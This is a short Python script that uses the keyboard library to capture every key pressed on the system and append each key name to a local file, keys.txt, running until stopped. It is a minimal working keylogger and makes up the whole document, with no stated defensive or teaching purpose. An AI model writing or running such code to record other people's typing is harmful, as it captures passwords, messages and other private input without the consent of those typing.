import keyboard

file = "keys.txt"


def on_pressed_key(e):
    with open(file, "a") as f:
        f.write("{}\n".format(e.name))


keyboard.on_press(on_pressed_key)
keyboard.wait()
